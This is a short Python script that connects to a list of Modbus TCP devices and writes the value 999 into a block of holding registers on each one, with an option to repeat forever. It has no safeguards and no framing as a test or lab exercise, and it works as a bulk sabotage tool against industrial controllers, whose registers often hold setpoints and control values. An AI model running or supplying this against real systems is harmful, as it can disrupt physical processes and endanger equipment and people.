#!/usr/bin/env python3
import argparse
import logging
import time

from pymodbus.client import ModbusTcpClient

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")


def parse_target(line: str, default_port: int, default_unit: int):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    parts = line.split(":")
    ip = parts[0]
    port = default_port
    unit = default_unit
    if len(parts) >= 2 and parts[1]:
        port = int(parts[1])
    if len(parts) >= 3 and parts[2]:
        unit = int(parts[2])
    return ip, port, unit


def write_999(ip: str, port: int, unit: int, start: int, count: int, timeout: float):
    client = ModbusTcpClient(ip, port=port, timeout=timeout)
    if not client.connect():
        logging.error("[%s] connect failed", ip)
        return

    ok = 0
    fail = 0
    for addr in range(start, start + count):
        resp = client.write_register(address=addr, value=999, device_id=unit)
        if resp and not resp.isError():
            ok += 1
        else:
            fail += 1

    client.close()
    logging.info("[%s] done ok=%d fail=%d (unit=%d)", ip, ok, fail, unit)


def main():
    p = argparse.ArgumentParser(description="Write 999 to many Modbus TCP slaves (simple)")
    p.add_argument("--targets", required=True, help="Path to targets file (ip[:port[:unit]] per line)")
    p.add_argument("--start", type=int, default=1, help="Start holding register (default: 1)")
    p.add_argument("--count", type=int, default=100, help="How many registers (default: 100)")
    p.add_argument("--port", type=int, default=502, help="Default port (default: 502)")
    p.add_argument("--unit", type=int, default=1, help="Default unit/device_id (default: 1)")
    p.add_argument("--timeout", type=float, default=2.0, help="TCP timeout seconds (default: 2.0)")
    p.add_argument("--loop", action="store_true", help="Repeat forever")
    p.add_argument("--interval", type=float, default=2.0, help="Seconds between loops (default: 2.0)")
    args = p.parse_args()

    with open(args.targets, "r", encoding="utf-8") as f:
        targets = []
        for line in f:
            t = parse_target(line, args.port, args.unit)
            if t:
                targets.append(t)

    if not targets:
        logging.error("No targets found in %s", args.targets)
        return

    while True:
        for ip, port, unit in targets:
            write_999(ip, port, unit, args.start, args.count, args.timeout)

        if not args.loop:
            break
        time.sleep(args.interval)


if __name__ == "__main__":
    main()